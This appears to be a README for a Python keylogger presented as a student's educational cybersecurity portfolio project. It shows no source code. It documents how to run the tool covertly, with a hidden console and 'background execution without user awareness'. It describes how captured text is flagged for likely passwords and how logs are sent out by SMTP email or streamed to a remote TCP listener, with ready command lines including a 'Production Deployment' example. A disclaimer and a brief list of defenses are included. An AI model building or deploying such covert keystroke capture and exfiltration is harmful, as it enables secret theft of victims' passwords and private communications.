# Educational Keylogger Project

## ⚠️ LEGAL DISCLAIMER
**THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY.**

Unauthorized use of keyloggers is **ILLEGAL** and **UNETHICAL**. Only use this software on systems you own or have explicit written permission to monitor. The author is not responsible for any misuse of this software.

This project is designed for cybersecurity portfolio demonstration and educational learning purposes only.

---

## 📋 Project Overview

This is a keylogger implementation created as part of a cybersecurity portfolio to demonstrate understanding of:
- System-level input capture
- Event-driven programming
- Security concepts and vulnerabilities
- Ethical hacking principles
- Stealth techniques

---

## 🚀 Current Status: Phase 4B Completed

### Phase 1: Basic Keystroke Capture ✅
**Features Implemented:**
- ✅ Capture all keyboard inputs (letters, numbers)
- ✅ Intelligent handling of special characters (punctuation, symbols)
- ✅ Modifier key tracking (Shift, Ctrl, Alt, Win)
- ✅ Special key detection (Enter, Backspace, Tab, Arrow keys, etc.)
- ✅ Timestamp for each event
- ✅ Real-time display of captured keystrokes
- ✅ Clean exit with ESC key

### Phase 2: Intelligent Logging ✅
**Features Implemented:**
- ✅ File-based logging system
- ✅ Automatic log directory creation
- ✅ Session-based log files with unique identifiers
- ✅ File rotation (automatic new file when size limit reached)
- ✅ Session metadata tracking (system info, timestamps, duration)
- ✅ Session headers and footers with statistics
- ✅ UTF-8 encoding support
- ✅ Active window title detection (Windows)
- ✅ Configurable max file size
- ✅ **Text reconstruction** - Readable text instead of raw keystrokes
- ✅ **Password detection** - Automatic identification of potential passwords
- ✅ **Human-readable summary file** - Easy analysis of user activity

### Phase 3: Stealth Mode ✅
**Features Implemented:**
- ✅ **Command-line arguments** - Flexible operation modes
- ✅ **Hidden console window** - Invisible operation (Windows)
- ✅ **Secret stop combination** - Ctrl+Shift+Esc to stop in stealth mode
- ✅ **Silent operation** - No console output in stealth mode
- ✅ **Background execution** - Runs without user awareness
- ✅ **Dual mode operation** - Normal mode for testing, stealth for deployment

### Phase 4: Data Transmission ✅
**Features Implemented:**

#### Phase 4A: Email Transmission ✅
- ✅ **SMTP Email Transmission** - Automatic log sending via email
- ✅ **Periodic Transmission** - Configurable intervals (default: 30 minutes)
- ✅ **Multiple Email Providers** - Gmail, Outlook, Yahoo, custom SMTP
- ✅ **App Password Support** - Secure authentication
- ✅ **Encryption Support** - Optional Fernet encryption for attachments
- ✅ **Batch Sending** - Multiple log files in single email
- ✅ **Auto-Delete After Send** - Optional log cleanup

#### Phase 4B: Network Transmission ✅
- ✅ **TCP Socket Communication** - Real-time log streaming
- ✅ **Persistent Connection** - Efficient data transmission
- ✅ **Listener Server** - Dedicated server for receiving logs
- ✅ **Multi-client Support** - Server handles multiple keyloggers
- ✅ **Live Display** - Real-time keystroke monitoring
- ✅ **Mouse Click Detection** - Intelligent cursor position tracking
- ✅ **Window Context Preservation** - Per-window buffer management

---

## 📦 Installation

### Requirements
- Python 3.7 or higher
- pip package manager
- Windows OS (for full functionality)

### Setup
1. Clone or download this repository
2. Install dependencies:
```bash
pip install -r requirements.txt
```

---

## 🎮 Usage

### Normal Mode (Testing/Development)
Run with full console output for testing:
```bash
python main.py
```

**Stop:** Press **ESC** key

### Stealth Mode (Hidden Operation)
Run invisible in the background:
```bash
python main.py --stealth
```
or
```bash
python main.py -s
```

**Stop:** Press **Ctrl+Shift+Esc** simultaneously

### Advanced Options

**Custom log directory:**
```bash
python main.py --directory my_logs
```

**Custom max file size (in KB):**
```bash
python main.py --max-size 500
```

**Combine options:**
```bash
python main.py --stealth --directory custom_logs --max-size 200
```

**Help:**
```bash
python main.py --help
```

---

## 📁 Log Files

### Output Files
The keylogger creates two types of files in the logs directory:

#### 1. Raw Logs (`keylog_session_XXXXXX_part_XXXXXX.txt`)
- Complete keystroke data with timestamps
- All modifier keys and special keys
- Technical format for detailed analysis

#### 2. Summary File (`summary_session_XXXXXX.txt`) ⭐
- **Human-readable format**
- Reconstructed text entries
- Window/application tracking
- **Potential passwords highlighted**
- Session statistics

### Log Directory Structure
```
logs/
├── keylog_session_20251104_143000_part_20251104_143000.txt
├── summary_session_20251104_143000.txt
└── ...
```

---

## 📧 Phase 4A: Email Transmission Configuration

### Quick Start - Email Setup

#### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

#### 2. Configure Email Settings

Create a `.env` file in the project root:

```env
# Email Configuration (SMTP)
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SMTP_EMAIL=your_email@gmail.com
SMTP_PASSWORD=your_app_password_here
RECIPIENT_EMAIL=recipient@gmail.com

# Transmission Settings
TRANSMISSION_INTERVAL=30
AUTO_DELETE_AFTER_SEND=False

# Encryption (optional)
ENCRYPTION_ENABLED=False
ENCRYPTION_KEY=generate_a_key_here
```

### Email Provider Configuration

#### Gmail (Recommended)

1. **Enable 2-Factor Authentication** on your Google account
2. **Generate an App Password**:
   - Go to: https://myaccount.google.com/apppasswords
   - Select "Mail" and "Other (Custom name)"
   - Name it "Keylogger" or any name
   - Copy the 16-character password
   
3. **Configure .env**:
```env
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SMTP_EMAIL=your_email@gmail.com
SMTP_PASSWORD=xxxx xxxx xxxx xxxx  # Your App Password
RECIPIENT_EMAIL=recipient@gmail.com
```

#### Outlook/Hotmail

```env
SMTP_SERVER=smtp-mail.outlook.com
SMTP_PORT=587
SMTP_EMAIL=your_email@outlook.com
SMTP_PASSWORD=your_password
RECIPIENT_EMAIL=recipient@outlook.com
```

#### Yahoo Mail

```env
SMTP_SERVER=smtp.mail.yahoo.com
SMTP_PORT=587
SMTP_EMAIL=your_email@yahoo.com
SMTP_PASSWORD=your_app_password
RECIPIENT_EMAIL=recipient@yahoo.com
```

### Usage Examples - Email Transmission

#### Basic Usage with Email Transmission
```bash
python main.py --transmit
```

#### Custom Transmission Interval (15 minutes)
```bash
python main.py --transmit --interval 15
```

#### Stealth Mode + Transmission
```bash
python main.py --stealth --transmit --interval 20
```

### Encryption Setup (Optional)

#### Generate Encryption Key
```bash
python email_transmitter.py generate-key
```

This will output a key like:
```
Generated encryption key:
xxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXX=

Add this key to your .env file as ENCRYPTION_KEY
```

#### Enable Encryption in .env
```env
ENCRYPTION_ENABLED=True
ENCRYPTION_KEY=xxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXX=
```

#### Decrypt Received Files
```bash
python email_transmitter.py decrypt encrypted_file.txt.encrypted YOUR_KEY
```

### Email Troubleshooting

#### Error: "SMTP Authentication failed"
**Solutions:**
1. Check that your email and password are correct
2. For Gmail: Use an App Password, not your regular password
3. Enable "Less secure app access" (not recommended) or use App Passwords
4. Check if 2FA is enabled (required for App Passwords)

#### Error: "Connection test failed"
**Solutions:**
1. Check your internet connection
2. Verify SMTP server address and port
3. Check if your firewall is blocking port 587
4. Try port 465 with SSL instead of 587 with TLS

#### No Emails Received
**Check:**
1. Spam/Junk folder in recipient email
2. Logs for transmission errors
3. Email provider limits (some limit automated emails)
4. Verify RECIPIENT_EMAIL is correct

---

## 🌐 Phase 4B: Network Transmission Configuration

### Quick Start - Network Setup

#### 1. Start the Listener Server

On the **monitoring machine** (where you want to receive logs):

```bash
python listener_server.py
```

This starts listening on `0.0.0.0:9999` (all interfaces, port 9999).

#### 2. Start the Keylogger with Network Transmission

On the **target machine** (where you want to capture keystrokes):

```bash
python main.py --network --host 192.168.1.100
```

Replace `192.168.1.100` with the IP address of your listener server.

### Network Command Line Options

#### Keylogger (Client)

| Argument | Short | Description | Default |
|----------|-------|-------------|---------|
| `--network` | `-n` | Enable network transmission | Disabled |
| `--host` | `-H` | Listener server IP address | Required |
| `--port` | `-p` | Listener server port | 9999 |

#### Listener Server

| Argument | Short | Description | Default |
|----------|-------|-------------|---------|
| `--host` | `-H` | Bind address | `0.0.0.0` (all interfaces) |
| `--port` | `-p` | Listen port | 9999 |
| `--output` | `-o` | Output directory for logs | `received_logs` |
| `--no-save` | | Don't save logs (display only) | Save enabled |

### Network Usage Examples

#### Basic Network Transmission
```bash
# Server
python listener_server.py

# Client
python main.py --network --host 192.168.1.100
```

#### Custom Port
```bash
# Server
python listener_server.py --port 8888

# Client
python main.py --network --host 192.168.1.100 --port 8888
```

#### Display Only (No Save)
```bash
python listener_server.py --no-save
```

#### Stealth Mode with Network
```bash
python main.py --stealth --network --host 192.168.1.100
```

### Network Features

- **Real-time Transmission** - Logs sent immediately to listener server
- **Live Monitoring** - See keystrokes as they happen
- **Mouse Click Detection** - Intelligent tracking with `[🖱️CLICK?]` markers
- **Window Context** - Per-window buffer management
- **Session Tracking** - Multiple keylogger sessions supported
- **Persistent Connection** - Efficient TCP socket communication

### Network Troubleshooting

#### Connection Failed
**Solutions:**
1. Verify the listener server is running
2. Check firewall settings on both machines
3. Ensure the IP address is correct
4. Try pinging the server: `ping 192.168.1.100`
5. Check if port 9999 is open

#### Mouse Click Detection Issues
**Note:** Direct mouse listener has been disabled due to a `pynput.mouse` bug on Windows.
- The system uses **intelligent position analysis** (server-side)
- Clicks are detected by analyzing cursor position inconsistencies
- Look for `[🖱️CLICK?]` markers in the output

---

## 📋 Complete Command Reference

### All Available Options

```bash
python main.py [OPTIONS]

Options:
  -s, --stealth              Run in stealth mode (hidden console)
  -d, --directory DIR        Log directory (default: logs)
  -m, --max-size KB          Max file size before rotation (default: 100)
  -t, --transmit             Enable email transmission
  -i, --interval MINUTES     Transmission interval (default: 30)
  -n, --network              Enable network transmission
  -H, --host IP              Listener server IP address
  -p, --port PORT            Listener server port (default: 9999)
  --help                     Show help message
```

### Example Combinations

#### Full Featured Setup
```bash
python main.py --stealth --transmit --interval 15 --network --host 192.168.1.100
```

#### Testing Configuration
```bash
python main.py --directory test_logs --max-size 50
```

#### Production Deployment
```bash
python main.py --stealth --transmit --interval 60 --directory C:\hidden_logs
```

---

## 🔐 Security Best Practices

### Email Security
1. **Never commit `.env` file** to version control (already in .gitignore)
2. **Use App Passwords** instead of regular passwords
3. **Enable encryption** for sensitive data
4. **Use a dedicated email account** for the keylogger
5. **Delete logs after transmission** if enabled
6. **Keep encryption keys secure** and separate from the code

### Network Security
1. **Use on trusted networks only** (avoid public WiFi)
2. **Consider VPN** for remote monitoring
3. **Firewall rules** to restrict connections
4. **Change default port** for added security
5. **Monitor server logs** for unauthorized connections

---

## 🔍 Summary File Features

The summary file provides an easy-to-read analysis:

### Window Tracking
```
================================================================================
[2025-11-04 14:30:00] WINDOW CHANGED: Google Chrome - Gmail
================================================================================
```

### Text Reconstruction
```
[2025-11-04 14:30:15] TEXT TYPED: Hello, how are you doing today?
```

### Password Detection
```
[2025-11-04 14:31:20] [POTENTIAL PASSWORD] >>> MyP@ssw0rd123 <<<
```

### Session Statistics
```
================================================================================
FINAL SESSION STATISTICS
================================================================================
Total Duration: 0:15:30
Total Keys Pressed: 1,247
Different Windows Used: 8
Text Entries Captured: 34
Potential Passwords Found: 3
================================================================================
```

---

## 🛠️ Technical Stack

- **Language**: Python 3.x
- **Libraries**: 
  - `pynput` - Keyboard event capture
  - `datetime` - Timestamp generation
  - `os` - File system operations
  - `platform` - System information
  - `ctypes` - Windows API access (for stealth mode)
  - `re` - Regular expressions (for password detection)
  - `argparse` - Command-line argument parsing
  - `smtplib` - Email sending
  - `socket` - Network communication
  - `cryptography` - Encryption (optional)

---

## 📝 Features Detail

### Captured Data
- **Regular keys**: All alphanumeric characters
- **Special characters**: !@#$%^&*()_+-=[]{}|;':",.<>/?
- **Modifier keys**: Shift, Ctrl, Alt, Windows key
- **Special keys**: Enter, Backspace, Tab, Delete, Arrow keys, Function keys, etc.
- **Modifier combinations**: Tracks Ctrl+C, Alt+Tab, Win+R, etc.
- **Window context**: Active application for each keystroke

### Password Detection Algorithm
The keylogger uses heuristics to detect potential passwords:
- Minimum 4 characters
- No spaces (typical password requirement)
- At least 2 of the following:
  - Contains numbers
  - Contains special characters
  - Mixed case (uppercase and lowercase)

### Stealth Mode Features
- **Hidden console**: Uses Windows API to hide the console window
- **No visual feedback**: All output goes to log files only
- **Secret stop combination**: Ctrl+Shift+Esc (like Task Manager)
- **Background process**: Runs silently without user notification

---

## 🏗️ Project Roadmap

### ✅ Phase 1: Basic Keystroke Capture (COMPLETED)
- Capture all keyboard inputs with intelligent processing

### ✅ Phase 2: Intelligent Logging (COMPLETED)
- Log to file system with readable format
- Text reconstruction and password detection
- Window tracking and statistics

### ✅ Phase 3: Stealth Mode (COMPLETED)
- Hidden console and secret stop combination
- Command-line arguments for flexible operation
- Dual mode: normal and stealth

### ✅ Phase 4: Data Transmission (COMPLETED)
- Email transmission (SMTP)
- HTTP POST alternative
- Basic encryption
- Automatic periodic sending

### 🔜 Phase 5: Finalization
- Complete documentation
- Security measures
- Final testing and cleanup

---

## 📂 Project Structure

```
Keylogger/
├── main.py              # Main keylogger application
├── requirements.txt     # Python dependencies
├── README.md           # Project documentation
└── logs/               # Log files directory (auto-created)
    ├── keylog_*.txt    # Raw session log files
    └── summary_*.txt   # Human-readable summaries
```

---

## 🔒 Security Considerations

This keylogger demonstrates several security vulnerabilities:

1. **Input Capture**: Shows how easy it is to capture keyboard input
2. **Stealth Operation**: Demonstrates how malware can hide from users
3. **Password Exposure**: Highlights the danger of typing passwords on compromised systems
4. **Window Tracking**: Shows how user behavior can be monitored

**Defense Mechanisms:**
- Use on-screen keyboards for sensitive input
- Enable two-factor authentication
- Use password managers
- Monitor running processes
- Keep antivirus software updated

---

## 🧪 Testing Recommendations

1. **Normal Mode Testing**: Run without `--stealth` first to see output
2. **Test Stop Mechanism**: Verify ESC works in normal mode
3. **Stealth Mode Testing**: Launch with `--stealth` and verify console hides
4. **Stop in Stealth**: Test Ctrl+Shift+Esc combination
5. **Check Log Files**: Verify both raw logs and summary files are created
6. **Password Detection**: Type test passwords to verify detection works

---

## 👨‍💻 Author

**Mathieu**  
Cybersecurity Engineering Student  
CESI Engineering School

---

## 📜 License

This project is for educational purposes only. Use responsibly and ethically.

**Remember**: Always obtain explicit permission before monitoring any system you do not own.

---

## 🆘 Troubleshooting

### Console doesn't hide in stealth mode
- Ensure you're running on Windows
- Try running as administrator
- Check that `ctypes` is available

### Secret combination not working
- Ensure all three keys are pressed: Ctrl+Shift+Esc
- Try pressing them in order: Ctrl → Shift → Esc
- Check log files to verify keylogger is running

### No window tracking
- Windows API requires Windows OS
- Check permissions
- Some protected windows may not report their title

---

## 📊 Configuration Options Summary

| Feature | Option | Default | Description |
|---------|--------|---------|-------------|
| **Stealth Mode** | `--stealth` | Disabled | Hidden console, secret stop |
| **Log Directory** | `--directory` | `logs` | Where to save log files |
| **Max File Size** | `--max-size` | 100 KB | File rotation trigger |
| **Email Transmission** | `--transmit` | Disabled | Send logs via email |
| **Transmission Interval** | `--interval` | 30 min | How often to send emails |
| **Network Mode** | `--network` | Disabled | Real-time streaming |
| **Server Host** | `--host` | Required | Listener server IP |
| **Server Port** | `--port` | 9999 | Communication port |

---

## 📚 Educational Value

This project demonstrates:
- **Event-driven programming** with keyboard listeners
- **File I/O operations** with logging and rotation
- **System-level programming** with Windows API
- **Data analysis** with text reconstruction and pattern detection
- **Stealth techniques** used in real malware
- **Security awareness** of keyboard logging threats
- **Network programming** with TCP sockets
- **Email protocols** (SMTP) and encryption
- **Client-server architecture** for remote monitoring

---

## 📖 Additional Documentation

For more detailed information, see:
- **PHASE_4C_SUMMARY.md** - Network transmission technical details
- **PHASE_4C_USAGE.md** - Network transmission usage guide
- **MOUSE_CLICK_DETECTION.md** - Mouse click detection implementation
- **Email Transmitter** - Run `python email_transmitter.py --help` for email commands

---

**Happy Learning! 🎓**

*Remember: With great power comes great responsibility. Use this knowledge ethically.*
